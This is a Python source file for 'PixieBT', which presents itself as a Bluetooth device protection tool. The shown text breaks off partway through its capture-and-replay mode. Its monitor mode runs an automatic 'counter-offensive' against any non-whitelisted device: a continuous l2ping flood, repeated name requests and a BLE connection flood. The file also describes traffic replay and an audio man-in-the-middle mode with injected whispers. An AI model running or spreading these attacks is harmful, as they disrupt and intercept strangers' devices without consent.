# coding=utf-8
"""PixieBT — Bluetooth Device Monitoring & Protection Tool"""

import os
import sys
import re
import json
import time
import wave
import array
import signal
import shutil
import struct
import socket
import tempfile
import argparse
import subprocess
import configparser
import threading
from termcolor import colored
from argparse import RawTextHelpFormatter


banner_intro = """

██████╗ ██╗██╗  ██╗██╗███████╗██████╗ ████████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝██╔══██╗╚══██╔══╝
██████╔╝██║ ╚███╔╝ ██║█████╗  ██████╔╝   ██║
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝  ██╔══██╗   ██║
██║     ██║██╔╝ ██╗██║███████╗██████╔╝   ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═════╝    ╚═╝

----------------------------------------------------------------------
"""

CONFIG_FILE = "pixiebt.conf"
WHITELIST_FILE = "pixiebt_whitelist.json"
WHISPERS_TEXT_FILE = "whispers.txt"

# Audio constants for mode 4 (SCO CVSD: 8kHz, 16-bit, mono)
AF_BLUETOOTH = getattr(socket, 'AF_BLUETOOTH', 31)
BTPROTO_SCO = getattr(socket, 'BTPROTO_SCO', 2)
SCO_SAMPLE_RATE = 8000
SCO_SAMPLE_WIDTH = 2       # bytes per sample (16-bit)
SCO_PKT_SIZE = 48          # typical SCO-HV3 payload size
WHISPER_DETECT_WINDOW = 1600  # 200ms at 8kHz
ENERGY_THRESHOLD = 500     # RMS floor (below = silence)
ZCR_LOW = 0.05             # min zero-crossing rate
ZCR_HIGH = 0.40            # max zero-crossing rate
CV_THRESHOLD = 0.15        # energy coefficient of variation

DESCRIPTION = """
PixieBT - Bluetooth Device Monitoring & Protection

Modes:

  1 : Scan Bluetooth devices and select whitelist
  2 : Monitor + counter-offensive on unauthorized devices
  3 : Capture & replay — sniff non-whitelisted traffic and replay it
  4 : Audio MITM — intercept + whisper injection (2 adapters required)
----------------------------------------------------------------------
"""


# ──────────────────────────────────────────────
#  Configuration & helpers
# ──────────────────────────────────────────────

def load_config(config_path):
    config = configparser.ConfigParser()
    if not os.path.isfile(config_path):
        print(colored("[!] Config file not found: " + config_path, "red"))
        sys.exit(1)
    config.read(config_path)
    iface = config.get("bluetooth", "interface", fallback="hci0")
    whisper_lang = config.get("whisper", "lang", fallback=None)
    return iface, whisper_lang


def _get_controller_mac(iface):
    """Read the MAC address of an HCI interface from sysfs."""
    sysfs = "/sys/class/bluetooth/{}/address".format(iface)
    if os.path.isfile(sysfs):
        with open(sysfs) as f:
            return f.read().strip().upper()
    return None


def _list_bt_interfaces():
    """List available Bluetooth controllers (sysfs, bluetoothctl, hciconfig fallbacks)."""
    found = []
    # Method 1: sysfs (most reliable on Linux)
    bt_dir = "/sys/class/bluetooth"
    if os.path.isdir(bt_dir):
        for entry in sorted(os.listdir(bt_dir)):
            mac = _get_controller_mac(entry) or "??:??:??:??:??:??"
            found.append((entry, mac))
    if found:
        return found
    # Method 2: bluetoothctl list
    if shutil.which("bluetoothctl"):
        try:
            ret = subprocess.run(
                ["bluetoothctl", "list"],
                capture_output=True, text=True, timeout=5,
            )
            for line in ret.stdout.strip().split("\n"):
                m = re.match(r"Controller\s+([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
                if m:
                    found.append((m.group(2).strip() or "controller", m.group(1).upper()))
        except Exception:
            pass
    if found:
        return found
    # Method 3: hciconfig -a (legacy)
    if shutil.which("hciconfig"):
        try:
            ret = subprocess.run(
                ["hciconfig", "-a"],
                capture_output=True, text=True, timeout=5,
            )
            for m in re.finditer(r"(hci\d+)", ret.stdout):
                found.append((m.group(1), ""))
        except Exception:
            pass
    return found


def _btctl_scan(scan_time, quiet=False):
    """Discover devices using bluetoothctl. Returns {MAC: {name, type}}."""
    discovered = {}
    try:
        proc = subprocess.Popen(
            ["bluetoothctl", "--timeout", str(scan_time), "scan", "on"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        proc.wait(timeout=scan_time + 10)
    except Exception:
        pass
    try:
        ret = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        for line in ret.stdout.strip().split("\n"):
            m = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
            if m:
                mac = m.group(1).upper()
                name = m.group(2).strip() or "<unknown>"
                if mac not in discovered:
                    discovered[mac] = {"name": name, "type": "ble"}
                    if not quiet:
                        print(colored("      [+] {}: {}".format(mac, name), "green"))
    except Exception:
        pass
    return discovered


def check_interface(iface):
    """Verify that the HCI interface exists and is UP. Offer to bring it up.
    Supports modern bluetoothctl and legacy hciconfig."""
    use_btctl = shutil.which("bluetoothctl") is not None
    use_hciconfig = shutil.which("hciconfig") is not None

    if not use_btctl and not use_hciconfig:
        print(colored("[!] Neither bluetoothctl nor hciconfig found. Install bluez.", "red"))
        sys.exit(1)

    # ── Check existence ──
    iface_exists = os.path.isdir("/sys/class/bluetooth/" + iface)
    if not iface_exists and use_hciconfig:
        ret = subprocess.run(["hciconfig", iface], capture_output=True, text=True)
        iface_exists = (ret.returncode == 0)

    if not iface_exists:
        print(colored("[!] Interface '{}' not found.".format(iface), "red"))
        available = _list_bt_interfaces()
        if available:
            print(colored("[!] Available Bluetooth interfaces:", "red"))
            for name, mac in available:
                print(colored("      {} ({})".format(name, mac), "white"))
        else:
            print(colored("[!] No Bluetooth interfaces detected.", "red"))
            print(colored("    Check that a Bluetooth adapter is connected and drivers are loaded.", "red"))
        sys.exit(1)

    # ── Check UP status ──
    is_up = False
    if use_btctl:
        controller_mac = _get_controller_mac(iface)
        show_args = ["bluetoothctl", "show"]
        if controller_mac:
            show_args.append(controller_mac)
        try:
            ret = subprocess.run(show_args, capture_output=True, text=True, timeout=5)
            is_up = "Powered: yes" in ret.stdout
        except Exception:
            pass
    if not is_up and use_hciconfig:
        try:
            ret = subprocess.run(["hciconfig", iface], capture_output=True, text=True)
            is_up = "UP RUNNING" in ret.stdout
        except Exception:
            pass

    if is_up:
        print(colored("[+] {} is UP and RUNNING.".format(iface), "green"))
        return

    # ── Bring UP ──
    print(colored("[!] {} is DOWN.".format(iface), "red"))
    answer = input(colored("[?] Bring up {}? [y/N] ".format(iface), "cyan")).strip().lower()
    if answer != "y":
        print(colored("[!] Aborted.", "red"))
        sys.exit(1)

    if use_btctl:
        subprocess.run(["bluetoothctl", "power", "on"], capture_output=True, timeout=5)
    if use_hciconfig:
        subprocess.run(["hciconfig", iface, "up"], capture_output=True, timeout=5)

    # Verify
    is_up = False
    if use_btctl:
        controller_mac = _get_controller_mac(iface)
        show_args = ["bluetoothctl", "show"]
        if controller_mac:
            show_args.append(controller_mac)
        try:
            ret = subprocess.run(show_args, capture_output=True, text=True, timeout=5)
            is_up = "Powered: yes" in ret.stdout
        except Exception:
            pass
    if not is_up and use_hciconfig:
        try:
            ret = subprocess.run(["hciconfig", iface], capture_output=True, text=True)
            is_up = "UP RUNNING" in ret.stdout
        except Exception:
            pass

    if is_up:
        print(colored("[+] {} is now UP.".format(iface), "green"))
    else:
        print(colored("[!] Failed to bring up {}.".format(iface), "red"))
        sys.exit(1)


def load_whitelist():
    """Load whitelist: {mac: {"name": ..., "type": ..., "allowed_peers": {peer_mac: peer_name}}}
    Backward compatible with older formats."""
    if not os.path.isfile(WHITELIST_FILE):
        return {}
    with open(WHITELIST_FILE, "r") as f:
        data = json.load(f)
    if isinstance(data, list):
        return {m.upper(): {"name": "<unknown>", "type": "classic", "allowed_peers": {}} for m in data}
    result = {}
    for mac, val in data.items():
        if isinstance(val, dict):
            entry = {
                "name": val.get("name", "<unknown>"),
                "type": val.get("type", "classic"),
                "allowed_peers": {},
            }
            peers = val.get("allowed_peers", {})
            if isinstance(peers, dict):
                entry["allowed_peers"] = {p.upper(): n for p, n in peers.items()}
            elif isinstance(peers, list):
                entry["allowed_peers"] = {p.upper(): "<unknown>" for p in peers}
            result[mac.upper()] = entry
        else:
            result[mac.upper()] = {"name": str(val), "type": "classic", "allowed_peers": {}}
    return result


def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        json.dump(whitelist, f, indent=2)


# ──────────────────────────────────────────────
#  Scanning helpers
# ──────────────────────────────────────────────

def scan_classic(iface, scan_time=10):
    """Classic Bluetooth inquiry scan."""
    discovered = {}
    length = max(1, int(scan_time / 1.28))
    print(colored("    [BT]  Classic inquiry ({} s) ...".format(scan_time), "white"))
    try:
        ret = subprocess.run(
            ["hcitool", "-i", iface, "scan", "--flush", "--length", str(length)],
            capture_output=True, text=True, timeout=scan_time + 15,
        )
        for line in ret.stdout.strip().split("\n"):
            line = line.strip()
            match = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line)
            if match:
                mac = match.group(1).upper()
                name = match.group(2).strip() or "<unknown>"
                if mac not in discovered:
                    discovered[mac] = {"name": name, "type": "classic"}
                    print(colored("      [+] {}: {}".format(mac, name), "green"))
    except subprocess.TimeoutExpired:
        print(colored("    [!] Classic scan timed out.", "yellow"))
    except FileNotFoundError:
        print(colored("    [!] hcitool not found, falling back to bluetoothctl.", "yellow"))
        discovered.update(_btctl_scan(scan_time))
    return discovered


def scan_ble(iface, scan_time=10):
    """BLE (Low Energy) advertisement scan."""
    discovered = {}
    print(colored("    [BLE] Low Energy scan ({} s) ...".format(scan_time), "white"))
    try:
        proc = subprocess.Popen(
            ["hcitool", "-i", iface, "lescan", "--duplicates"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        deadline = time.time() + scan_time
        lines = []
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            time.sleep(0.5)
        proc.terminate()
        try:
            remaining, _ = proc.communicate(timeout=5)
            lines = remaining.strip().split("\n") if remaining else []
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

        for line in lines:
            line = line.strip()
            match = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line)
            if match:
                mac = match.group(1).upper()
                name = match.group(2).strip()
                if name in ("(unknown)", ""):
                    name = "<unknown>"
                if mac not in discovered:
                    discovered[mac] = {"name": name, "type": "ble"}
                    print(colored("      [+] {}: {}".format(mac, name), "green"))
                elif name != "<unknown>" and discovered[mac]["name"] == "<unknown>":
                    discovered[mac]["name"] = name
    except FileNotFoundError:
        print(colored("    [!] hcitool not found, falling back to bluetoothctl.", "yellow"))
        discovered.update(_btctl_scan(scan_time))
    except Exception as e:
        print(colored("    [!] BLE scan error: {}".format(e), "red"))

    # Fallback: also try bluetoothctl devices
    try:
        ret = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        for line in ret.stdout.strip().split("\n"):
            match = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
            if match:
                mac = match.group(1).upper()
                name = match.group(2).strip() or "<unknown>"
                if mac not in discovered:
                    discovered[mac] = {"name": name, "type": "ble"}
                    print(colored("      [+] {}: {} (cached)".format(mac, name), "green"))
    except Exception:
        pass

    return discovered


def scan_all(iface, scan_time=10, include_ble=True):
    """Run both classic + BLE scans."""
    discovered = {}
    classic = scan_classic(iface, scan_time)
    discovered.update(classic)
    if include_ble:
        ble = scan_ble(iface, scan_time)
        for mac, info in ble.items():
            if mac not in discovered:
                discovered[mac] = info
    return discovered


# ──────────────────────────────────────────────
#  Mode 1 : Scan & whitelist selection
# ──────────────────────────────────────────────

def mode_scan_whitelist(iface, scan_time=10, include_ble=True):
    """Interactive mode: two-step whitelist setup.
    Step 1: Select MY devices (to protect)
    Step 2: For each device, select which peers are allowed to connect to it."""
    print(colored("[*] Starting Bluetooth device scan ...", "cyan"))
    discovered = scan_all(iface, scan_time, include_ble)

    if not discovered:
        print(colored("[!] No Bluetooth devices found.", "red"))
        return

    dev_list = sorted(discovered.items(), key=lambda x: x[1]["name"])

    # ── Step 1: Select MY devices (to protect) ──
    print(colored("\n" + "=" * 65, "cyan"))
    print(colored("  STEP 1 — Select YOUR devices (the ones to PROTECT)", "cyan", attrs=["bold"]))
    print(colored("=" * 65, "cyan"))
    print(colored(
        " #   MAC                 NAME                         TYPE", "yellow"))
    print(colored(" " + "-" * 65, "yellow"))
    for idx, (mac, info) in enumerate(dev_list, start=1):
        print(" {:<4} {}   {:<29} {}".format(idx, mac, info["name"], info["type"]))

    print()
    print(colored("[?] Enter numbers of YOUR devices to protect (comma-separated), or 'all':", "cyan"))
    selection = input(">>> ").strip()

    if selection.lower() == "all":
        my_devices = [m for m, _ in dev_list]
    else:
        my_devices = []
        for part in selection.split(","):
            part = part.strip()
            if part.isdigit():
                idx = int(part)
                if 1 <= idx <= len(dev_list):
                    my_devices.append(dev_list[idx - 1][0])
                else:
                    print(colored("[!] Skipping invalid index: " + part, "red"))
            else:
                print(colored("[!] Skipping non-numeric input: " + part, "red"))

    if not my_devices:
        print(colored("[!] No devices selected. Aborting.", "red"))
        return

    print(colored("\n[+] Your protected devices:", "green"))
    for mac in my_devices:
        info = discovered[mac]
        print(colored("    {} ({}) [{}]".format(mac, info["name"], info["type"]), "green"))

    # ── Step 2: For each device, select allowed peers ──
    print(colored("\n" + "=" * 65, "cyan"))
    print(colored("  STEP 2 — For each device, select ALLOWED peers", "cyan", attrs=["bold"]))
    print(colored("  (other devices permitted to connect to it)", "cyan"))
    print(colored("=" * 65, "cyan"))

    # Build peer list = all discovered MINUS my_devices
    my_set = set(my_devices)
    peer_list = [(m, i) for m, i in dev_list if m not in my_set]

    existing = load_whitelist()

    for dev_mac in my_devices:
        dev_info = discovered[dev_mac]
        print(colored("\n  ┌─ Device: {} ({})".format(dev_mac, dev_info["name"]),
                      "green", attrs=["bold"]))

        # Show existing allowed peers if any
        old_entry = existing.get(dev_mac, {})
        old_peers = old_entry.get("allowed_peers", {}) if isinstance(old_entry, dict) else {}
        if old_peers:
            print(colored("  │  Current allowed peers:", "white"))
            for p_mac, p_name in old_peers.items():
                print(colored("  │    {} ({})".format(p_mac, p_name), "white"))

        if not peer_list:
            print(colored("  │  No other devices found — only active connection monitoring.", "yellow"))
            allowed_peers = old_peers
        else:
            print(colored("  │", "green"))
            print(colored("  │  Available peers:", "yellow"))
            for pidx, (pmac, pinfo) in enumerate(peer_list, start=1):
                marker = " ✓" if pmac in old_peers else ""
                print("  │   {:<4} {}   {} [{}]{}".format(
                    pidx, pmac, pinfo["name"], pinfo["type"], marker))

            print(colored("  │", "green"))
            print(colored("  │  [?] Allowed peers for this device (comma-separated), 'all', 'none', or 'keep':",
                          "cyan"))
            peer_sel = input("  │  >>> ").strip()

            if peer_sel.lower() == "keep":
                allowed_peers = old_peers
            elif peer_sel.lower() == "none":
                allowed_peers = {}
            elif peer_sel.lower() == "all":
                allowed_peers = {m: i["name"] for m, i in peer_list}
            else:
                allowed_peers = dict(old_peers)  # start from existing
                for part in peer_sel.split(","):
                    part = part.strip()
                    if part.isdigit():
                        pidx = int(part)
                        if 1 <= pidx <= len(peer_list):
                            pmac = peer_list[pidx - 1][0]
                            allowed_peers[pmac] = peer_list[pidx - 1][1]["name"]
                        else:
                            print(colored("  │  [!] Skipping invalid: " + part, "red"))

        # Build entry
        existing[dev_mac] = {
            "name": dev_info["name"],
            "type": dev_info["type"],
            "allowed_peers": allowed_peers,
        }

        n_peers = len(allowed_peers)
        label = "no peers (monitor-only)" if n_peers == 0 else "{} peer(s)".format(n_peers)
        print(colored("  └─ Saved: {} — {}".format(dev_info["name"], label), "green"))

    save_whitelist(existing)
    print(colored("\n[+] Whitelist saved: {} device(s) in {}".format(
        len(existing), WHITELIST_FILE), "green", attrs=["bold"]))

    # Summary
    print(colored("\n  WHITELIST SUMMARY", "cyan", attrs=["bold"]))
    print(colored("  " + "-" * 60, "cyan"))
    for mac in my_devices:
        entry = existing[mac]
        peers = entry.get("allowed_peers", {})
        print(colored("  {} ({}) [{}]".format(mac, entry["name"], entry["type"]), "green"))
        if peers:
            for pmac, pname in peers.items():
                print("    └─ allowed: {} ({})".format(pmac, pname))
        else:
            print(colored("    └─ no peers allowed (any connection = alert)", "yellow"))


# ──────────────────────────────────────────────
#  Mode 2 : Monitor & Protect
# ──────────────────────────────────────────────

def mode_monitor(iface, include_ble=True):
    """Monitor Bluetooth environment, detect unauthorized connections
    TO our protected devices, and launch counter-offensives."""

    whitelist = load_whitelist()
    if not whitelist:
        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
        sys.exit(1)

    # My protected devices + their allowed peers
    my_devices = {}  # mac -> {"name", "type", "allowed_peers": {mac: name}}
    all_known_macs = set()  # all MACs that are "ours" (protected + all peers)
    for mac, info in whitelist.items():
        mac_u = mac.upper()
        my_devices[mac_u] = info
        all_known_macs.add(mac_u)
        for peer_mac in info.get("allowed_peers", {}).keys():
            all_known_macs.add(peer_mac.upper())

    # Shared state
    detected_intruders = {}  # mac -> {"name", "type", "target_device", "first_seen", "count"}
    active_floods = {}       # mac -> Popen
    intruder_lock = threading.Lock()
    stop_event = threading.Event()

    stats = {
        "classic_scans": 0,
        "ble_scans": 0,
        "connection_checks": 0,
        "floods_started": 0,
        "ble_disrupts": 0,
    }

    def _on_sigint(sig, frame):
        print(colored("\n[*] Stopping ...", "yellow"))
        stop_event.set()

    signal.signal(signal.SIGINT, _on_sigint)

    # Print protected devices summary
    print(colored("[+] Protected devices ({}):".format(len(my_devices)), "green", attrs=["bold"]))
    for mac, info in my_devices.items():
        peers = info.get("allowed_peers", {})
        peer_label = "{} peer(s)".format(len(peers)) if peers else "any connection = alert"
        print(colored("    {} ({}) [{}] — {}".format(
            mac, info["name"], info["type"], peer_label), "green"))
        for pmac, pname in peers.items():
            print("      └─ allowed: {} ({})".format(pmac, pname))
    print(colored("[*] Interface : " + iface, "cyan"))
    print(colored("[*] BLE scan  : " + ("enabled" if include_ble else "disabled"), "cyan"))
    print(colored("[*] Monitoring connections to your devices (Ctrl+C to stop) ...", "cyan"))
    print()

    def _is_peer_allowed(intruder_mac, target_device_mac):
        """Check if intruder_mac is an allowed peer for target_device_mac."""
        entry = my_devices.get(target_device_mac)
        if not entry:
            return False
        allowed = entry.get("allowed_peers", {})
        if not allowed:
            return False  # no peers → any connection is suspicious
        return intruder_mac.upper() in {m.upper() for m in allowed}

    # Nearby devices seen by passive scans (info only, no counter-offensive)
    nearby_devices = {}  # mac -> {"name", "type", "first_seen", "count"}
    nearby_lock = threading.Lock()

    def _log_nearby(mac, name, dev_type, source):
        """Log a nearby device detected by passive scan. Info only."""
        mac_u = mac.upper()
        if mac_u in my_devices or mac_u in all_known_macs:
            return
        with nearby_lock:
            if mac_u in nearby_devices:
                nearby_devices[mac_u]["count"] += 1
                return
            nearby_devices[mac_u] = {
                "name": name,
                "type": dev_type,
                "first_seen": time.time(),
                "count": 1,
            }
        print(colored(
            "\n  [i] NEARBY DEVICE DETECTED",
            "yellow", attrs=["bold"]))
        print(colored(
            "      MAC  : {}".format(mac_u), "yellow"))
        print(colored(
            "      Name : {}".format(name), "yellow"))
        print(colored(
            "      Type : {}".format(dev_type), "white"))
        print(colored(
            "      Via  : {}".format(source), "white"))
        print(colored(
            "      Time : {}".format(time.strftime("%c")), "white"))
        print()

    def _alert_intruder(mac, name, dev_type, source, target_device=None):
        """Register an intruder attempting to connect and engage counter-offensive."""
        with intruder_lock:
            if mac in detected_intruders:
                detected_intruders[mac]["count"] += 1
                return False
            detected_intruders[mac] = {
                "name": name,
                "type": dev_type,
                "first_seen": time.time(),
                "count": 1,
                "source": source,
                "target_device": target_device,
            }
        target_info = ""
        if target_device:
            dev_name = my_devices.get(target_device, {}).get("name", "?")
            target_info = " → {}".format(dev_name)
        print(colored(
            "\n  [!!!] UNAUTHORIZED CONNECTION{}".format(target_info.upper()),
            "red", attrs=["bold", "reverse"]))
        print(colored(
            "        Intruder MAC : {}".format(mac), "red", attrs=["bold"]))
        print(colored(
            "        Name         : {}".format(name), "red", attrs=["bold"]))
        print(colored(
            "        Type         : {}".format(dev_type), "yellow"))
        if target_device:
            print(colored(
                "        Target device: {} ({})".format(target_device, dev_name), "green"))
        print(colored(
            "        Via          : {}".format(source), "yellow"))
        print(colored(
            "        Time         : {}".format(time.strftime("%c")), "yellow"))
        print(colored(
            "        [>>>] COUNTER-OFFENSIVE ENGAGED", "red", attrs=["bold"]))
        print()
        return True

    # ── Thread 1: Classic BT inquiry scan ──
    def classic_scan_loop():
        use_hcitool = shutil.which("hcitool") is not None
        while not stop_event.is_set():
            try:
                if use_hcitool:
                    length = max(1, int(8 / 1.28))
                    ret = subprocess.run(
                        ["hcitool", "-i", iface, "scan", "--flush", "--length", str(length)],
                        capture_output=True, text=True, timeout=20,
                    )
                    for line in ret.stdout.strip().split("\n"):
                        line = line.strip()
                        match = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line)
                        if match:
                            mac = match.group(1).upper()
                            name = match.group(2).strip() or "<unknown>"
                            _log_nearby(mac, name, "classic", "inquiry scan")
                else:
                    devs = _btctl_scan(8, quiet=True)
                    for mac, info in devs.items():
                        _log_nearby(mac, info["name"], "classic", "bluetoothctl scan")
                stats["classic_scans"] += 1
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
            stop_event.wait(30)

    # ── Thread 2: BLE advertisement scan ──
    def ble_scan_loop():
        use_hcitool = shutil.which("hcitool") is not None
        while not stop_event.is_set():
            if not include_ble:
                stop_event.wait(60)
                continue
            try:
                if use_hcitool:
                    proc = subprocess.Popen(
                        ["hcitool", "-i", iface, "lescan", "--duplicates"],
                        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
                    )
                    time.sleep(8)
                    proc.terminate()
                    try:
                        remaining, _ = proc.communicate(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait()
                        remaining = ""
                    for line in (remaining or "").strip().split("\n"):
                        line = line.strip()
                        match = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line)
                        if match:
                            mac = match.group(1).upper()
                            name = match.group(2).strip()
                            if name in ("(unknown)", ""):
                                name = "<unknown>"
                            _log_nearby(mac, name, "ble", "BLE scan")
                else:
                    devs = _btctl_scan(8, quiet=True)
                    for mac, info in devs.items():
                        _log_nearby(mac, info["name"], "ble", "bluetoothctl BLE scan")
                stats["ble_scans"] += 1
            except Exception:
                pass
            stop_event.wait(15)

    # ── Thread 3: Active connection monitor ──
    def connection_monitor():
        """Check active HCI connections. If a connected device is not an
        allowed peer of any of our devices, raise an alert."""
        use_hcitool = shutil.which("hcitool") is not None
        while not stop_event.is_set():
            try:
                connected_macs = []
                if use_hcitool:
                    ret = subprocess.run(
                        ["hcitool", "-i", iface, "con"],
                        capture_output=True, text=True, timeout=5,
                    )
                    for line in ret.stdout.split("\n"):
                        match = re.search(r"([0-9A-Fa-f:]{17})", line)
                        if match:
                            connected_macs.append(match.group(1).upper())
                else:
                    try:
                        ret = subprocess.run(
                            ["bluetoothctl", "devices", "Connected"],
                            capture_output=True, text=True, timeout=5,
                        )
                        for line in ret.stdout.strip().split("\n"):
                            match = re.match(r"Device\s+([0-9A-Fa-f:]{17})", line.strip())
                            if match:
                                connected_macs.append(match.group(1).upper())
                    except Exception:
                        pass
                for mac in connected_macs:
                    if mac in my_devices:
                        continue  # it's one of ours
                    # Check against per-device allowed peers
                    authorized = False
                    for dev_mac, dev_info in my_devices.items():
                        allowed = dev_info.get("allowed_peers", {})
                        if mac in {p.upper() for p in allowed.keys()}:
                            authorized = True
                            break
                    if not authorized:
                        _alert_intruder(
                            mac, "<connected>", "active",
                            "active connection",
                            target_device=None,
                        )
                stats["connection_checks"] += 1
            except Exception:
                pass
            stop_event.wait(5)

    # ── Thread 4: Counter-offensive ──
    def counter_loop():
        """L2CAP ping flood on classic BT intruders,
        BLE connection flood on BLE intruders."""
        while not stop_event.is_set():
            with intruder_lock:
                targets = dict(detected_intruders)

            for mac, info in targets.items():
                if stop_event.is_set():
                    break

                dev_type = info["type"]

                # ── Classic BT / active: L2CAP flood ──
                if dev_type in ("classic", "active"):
                    need_start = False
                    if mac not in active_floods:
                        need_start = True
                    elif active_floods[mac].poll() is not None:
                        need_start = True  # process ended, restart

                    if need_start:
                        try:
                            proc = subprocess.Popen(
                                ["l2ping", "-i", iface, "-s", "600", "-f", mac],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            )
                            active_floods[mac] = proc
                            stats["floods_started"] += 1
                            print(colored(
                                "  [>>>] L2CAP flood started → {}".format(mac), "red"))
                        except FileNotFoundError:
                            print(colored(
                                "  [!] l2ping not found — install bluez", "red"))
                        except Exception:
                            pass

                    # Also spam name requests to keep the device busy
                    try:
                        subprocess.run(
                            ["hcitool", "-i", iface, "name", mac],
                            capture_output=True, timeout=3,
                        )
                    except Exception:
                        pass

                # ── BLE: Connection flood ──
                elif dev_type == "ble":
                    try:
                        ret = subprocess.run(
                            ["hcitool", "-i", iface, "lecc", mac],
                            capture_output=True, text=True, timeout=8,
                        )
                        handle_match = re.search(r"handle\s+(\d+)", ret.stdout)
                        if handle_match:
                            handle = handle_match.group(1)
                            time.sleep(0.1)
                            subprocess.run(
                                ["hcitool", "-i", iface, "ledc", handle],
                                capture_output=True, timeout=3,
                            )
                        stats["ble_disrupts"] += 1
                    except Exception:
                        pass

            stop_event.wait(5)

    # ── Start threads ──
    threads = []
    for name, target in [
        ("classic_scan", classic_scan_loop),
        ("ble_scan", ble_scan_loop),
        ("conn_monitor", connection_monitor),
        ("counter", counter_loop),
    ]:
        t = threading.Thread(target=target, name=name, daemon=True)
        t.start()
        threads.append(t)

    # ── Main: summary loop ──
    while not stop_event.is_set():
        time.sleep(15)
        if stop_event.is_set():
            break

        with intruder_lock:
            n_intruders = len(detected_intruders)
            snapshot = {
                mac: dict(info) for mac, info in detected_intruders.items()
            }

        n_floods = len([m for m, p in active_floods.items() if p.poll() is None])

        with nearby_lock:
            n_nearby = len(nearby_devices)

        color = "yellow" if n_intruders == 0 else "red"
        print(colored(
            "\n[*] Status: {} intruder(s) | {} nearby device(s) | {} active flood(s) | "
            "scans: {} classic, {} BLE, {} conn checks".format(
                n_intruders, n_nearby, n_floods,
                stats["classic_scans"], stats["ble_scans"],
                stats["connection_checks"]),
            color))

        if snapshot:
            print(colored(
                "[*] Counter-offensive: {} L2CAP flood(s) started, {} BLE disruption(s)".format(
                    stats["floods_started"], stats["ble_disrupts"]),
                "red", attrs=["bold"]))
            for mac, info in sorted(snapshot.items()):
                flood_status = ""
                if mac in active_floods and active_floods[mac].poll() is None:
                    flood_status = colored(" [FLOODING]", "red", attrs=["bold"])
                print("    {} ({}) [{}] — seen {}x via {}{}".format(
                    mac, info["name"], info["type"],
                    info["count"], info["source"], flood_status))
        elif n_nearby:
            print(colored("[*] {} nearby device(s) (passive, no counter-offensive).".format(n_nearby), "yellow"))
        else:
            print(colored("[*] All clear — no unauthorized devices.", "green"))

    # ── Cleanup ──
    print(colored("[*] Stopping counter-offensives ...", "yellow"))
    for mac, proc in active_floods.items():
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
    for t in threads:
        t.join(timeout=5)
    print(colored("[*] PixieBT stopped.", "yellow"))


# ──────────────────────────────────────────────
#  Mode 3 : Capture & Replay
# ──────────────────────────────────────────────

def mode_replay(iface, include_ble=True, replay_count=10, capture_duration=1):
    """Capture Bluetooth traffic from non-whitelisted devices and replay it.
    Uses btmon to capture raw HCI traffic, filters non-whitelisted MACs,
    and replays the captured packets."""

    whitelist = load_whitelist()
    if not whitelist:
        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
        sys.exit(1)

    wl_macs = {m.upper() for m in whitelist.keys()}
    all_known = set(wl_macs)
    for info in whitelist.values():
        for peer_mac in info.get("allowed_peers", {}).keys():
            all_known.add(peer_mac.upper())

    stop_event = threading.Event()

    def _on_sigint(sig, frame):
        print(colored("\n[*] Stopping ...", "yellow"))
        stop_event.set()

    signal.signal(signal.SIGINT, _on_sigint)

    # Check tools
    has_btmon = shutil.which("btmon") is not None
    has_hcidump = shutil.which("hcidump") is not None
    has_hcitool = shutil.which("hcitool") is not None
    use_btctl = shutil.which("bluetoothctl") is not None

    if not has_btmon and not has_hcidump:
        print(colored("[!] Neither btmon nor hcidump found. Install bluez.", "red"))
        sys.exit(1)

    print(colored("[+] Mode 3 — Capture & Replay", "cyan", attrs=["bold"]))
    print(colored("[*] Interface      : {}".format(iface), "cyan"))
    print(colored("[*] Capture window : {} s".format(capture_duration), "cyan"))
    print(colored("[*] Replay count   : {}x".format(replay_count), "cyan"))
    print(colored("[*] Whitelisted    : {} device(s)".format(len(wl_macs)), "cyan"))
    print(colored("[*] BLE scan       : {}".format("enabled" if include_ble else "disabled"), "cyan"))
    print(colored("[*] Scanning for non-whitelisted devices ...\n", "cyan"))

    capture_dir = "/tmp/pixiebt_captures"
    os.makedirs(capture_dir, exist_ok=True)

    stats = {
        "captures": 0,
        "replays": 0,
        "targets": set(),
    }

    def _discover_targets():
        """Find non-whitelisted devices via scan."""
        targets = {}
        if has_hcitool:
            # Classic scan
            try:
                length = max(1, int(8 / 1.28))
                ret = subprocess.run(
                    ["hcitool", "-i", iface, "scan", "--flush", "--length", str(length)],
                    capture_output=True, text=True, timeout=20,
                )
                for line in ret.stdout.strip().split("\n"):
                    m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
                    if m:
                        mac = m.group(1).upper()
                        name = m.group(2).strip() or "<unknown>"
                        if mac not in all_known:
                            targets[mac] = {"name": name, "type": "classic"}
            except Exception:
                pass
            # BLE scan
            if include_ble:
                try:
                    proc = subprocess.Popen(
                        ["hcitool", "-i", iface, "lescan", "--duplicates"],
                        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
                    )
                    time.sleep(8)
                    proc.terminate()
                    try:
                        remaining, _ = proc.communicate(timeout=5)
